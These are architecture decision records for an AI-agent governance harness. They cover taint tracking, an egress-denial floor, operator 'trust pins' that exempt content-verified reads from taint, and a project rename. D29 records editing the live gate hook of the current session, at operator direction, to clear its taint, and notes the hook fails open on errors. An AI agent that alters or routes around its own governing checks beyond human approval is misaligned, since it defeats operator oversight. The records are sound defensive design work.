## D29 — `trust_pins`: operator trust attestations pinned to content identity; taint becomes a recomputed cause-ledger
- **Epic:** E13.8 / E2 (taint) · extends D25 · **Status:** Accepted (live-hook interim shipped; canonical kernel field pending) · **See:** [`docs/trust-pins.md`](docs/trust-pins.md)
- **Decision:** Add **`trust_pins`** — operator attestations that a *specific read
  source is trusted*, each pinned to the source's **content identity** (`sha256` of
  the file bytes, or a reference repo's own `git_commit` + clean tree). At gate time
  a `Read` whose **live** content still matches a pin is classified **Trusted** and
  does **not** taint; any **drift** (bytes/commit change) or `expires` date revokes
  the pin and the read taints as normal. The per-session taint sidecar becomes a
  **ledger of causes**, and `tainted` is **recomputed every call** = *any recorded
  cause not covered by a valid pin*. Shipped in the live host hook: shared logic in
  `.claude/hooks/_gatelib.py` (used by both `world-gate.py` and `taint-notify.py`),
  `trust_pins` declared in `.claude/cc-world.json`. The **canonical home** is a
  `trust_pins` field in the real `WorldManifest` enforced by the pure `gate()`
  (kernel), to land with the D26 host cutover.
- **Why it is NOT a hole in invariant 6 (monotonic taint) or 7 (egress floor):** a
  pin re-classifies a source's trust **upstream of taint** — a pinned, content-
  verified read was *never* an untrusted-taint cause, so the recompute reflects
  *corrected provenance* (a human, design-time, auditable attestation), not a
  decrease of taint under fixed facts. The ledger **retains every cause** (audit),
  drift is **tamper-evident** (the descriptor-drift primitive from `safe-mcp-proxy`
  applied to reads), and the floor itself is untouched — an unpinned/tainted cause
  still `DENY`s egress. In the manifest's channel model it is exactly: a valid pin
  flips a read's `source_channel` from `workspace_files` (SemiTrusted, taint:true)
  to **Trusted (taint:false)**.
- **Binding correction (vs the initial "pin to HEAD" sketch):** bound to **content
  identity, not the harness repo's `HEAD`** — `repos/3p` is *not tracked in this
  repo* (`AGENTS.md`: never `git add repos/`), so this repo's HEAD says nothing about
  that content. Use the file's `sha256` (git-agnostic, per-file precise) or the
  **reference repo's own** HEAD commit + clean tree.
- **Resolves D25's deferred read-taint:** D25 option (a) was "tag an untrusted read
  with an untrusted `source_channel`"; `trust_pins` is the *exception* that re-tags a
  vouched read as Trusted. Implement the two together in the kernel port.
- **Alternatives:** (a) **delete the sidecar / reset taint** — rejected: unrecorded,
  blind re-taint, indistinguishable from a decrease-by-fiat; (b) **drop `repos/` from
  `taint_sources`** — rejected: blanket-trusts the whole tree *forever*, including
  future malicious edits, with no drift detection; (c) **drop `WebFetch` from
  `egress.tools`** — rejected: weakens invariant 7 itself; (d) **implement only in the
  kernel/manifest now** — the correct long-term home, but it does not govern the live
  session, so it cannot clear an in-flight tainted session (the operator's immediate
  need); recorded as the canonical follow-up; (e) **pin to the harness repo's HEAD** —
  rejected per the binding correction above.
- **Why ship the interim in the live hook:** the live `world-gate.py` is what governs
  this session; the pin/ledger is provable in isolation (`test-gate.sh` §4 + a
  throwaway-projdir simulation, both run green) and fails **open** on any helper/parse
  error, so it cannot brick a session. This mirrors the E13.2 "Python-first slice
  before the kernel ABI" pattern (D19→D24).
- **Known limits:** (1) the interim **grows the Python reimplementation D24 wants to
  retire** — accepted as interim; canonical logic is one `gate()` in the kernel.
  (2) a `sha256` pin is per-file; a `git_commit` pin trusts a whole clean tree at a
  commit (coarser, voided by any local edit). (3) editing the hook that governs *this*
  session is the **self-governance risk D26 flags** — done at operator direction, with
  fail-open preserved and out-of-band validation before reliance. (4) a pin is only as
  good as the operator's review of those bytes — it deliberately moves trust from *the
  model's runtime judgement* to *a human's design-time attestation*. That is the point.

## D30 — Rename the umbrella project `cli-agent` → `ai2rules`; "harness" stays the action layer
- **Status:** Accepted (rename) · refines/advances D23 · **See:** [`docs/THESIS.md`](docs/THESIS.md) §7
- **Decision:** Rename the repository / umbrella project from `cli-agent` ("CLI Agent
  Harness") to **`ai2rules`** — repo = site = thesis (the work already publishes at
  **ai2rules.dev**, and "AI → rules" *is* the stochastic→deterministic move). The old
  name had been outgrown: per **D23** the repo became the **umbrella over the five-layer
  thesis** (action · capability · knowledge · intent · substrate), not just the
  action-layer harness, so a name describing only the harness no longer fit. Scope of
  this change: GitHub repo renamed `sv-pro/cli-agent → sv-pro/ai2rules` (GitHub
  auto-redirects old URLs; local `gh` remote re-pointed); in-repo **identity + brand
  surfaces** (`README` title + an explicit "umbrella/companion for ai2rules.dev" note,
  `PLAN`/`DECISIONS`/`AGENTS` headers, `Cargo.toml` `repository`, blog `SITE_TITLE` /
  header / footer / about / index / DEPLOY, the `cli-harness` binary banner) → `ai2rules`.
  The **action-layer component keeps the name "harness"** (the kernel, the `cli-harness`
  binary, `docs/harness-architecture*.md`) because it is accurate and is *one* layer.
  **Crate names are unchanged** (`world-kernel`, `compiler`, `executor`, `cli-harness`,
  `harness-types`, …) — internal and still correct.
- **Why `ai2rules` over the alternatives:** chosen (by the maintainer) over
  `agentic-governance` (descriptive but generic / SEO-flat as a repo slug), `Worldgate`
  (a strong coined brand, but a new name to seed), and `IntentOS` (reads as a product and
  **D23** flagged it overweights the least-mature fragment). `ai2rules` reuses an
  already-owned domain, so repo = site = brand with zero new surface.
- **Alternatives:** keep `cli-agent` — rejected: it names only the action layer and
  actively misleads now that the repo is the umbrella; the three names above.
- **Deferred (the open companions, still from D23 §7.3 / THESIS §7):** (1) the **GitLab**
  mirror rename (`origin`) — done via its web UI, not scripted (a `curl` to the GitLab API
  is itself denied by our taint floor while the session is tainted — a fitting dogfood);
  (2) the **local working-dir** rename `cli-agent/ → ai2rules/` — deferred (renaming the
  CWD mid-session breaks paths/hooks); (3) the **physical consolidation** of the sibling
  repos into one tree (meta-repo with submodules vs. a single Cargo/workspace) — the
  umbrella *form* remains the genuinely open decision, to be recorded when taken.
- **Known limits:** published blog-post *prose* and the `harness-architecture*.md` titles
  still say "CLI Agent Harness" — kept deliberately (they describe the action-layer harness
  / are historical published content); a prose-rebrand pass is optional follow-up. The
  GitLab repo stays named `cli-agent` until renamed in its UI.

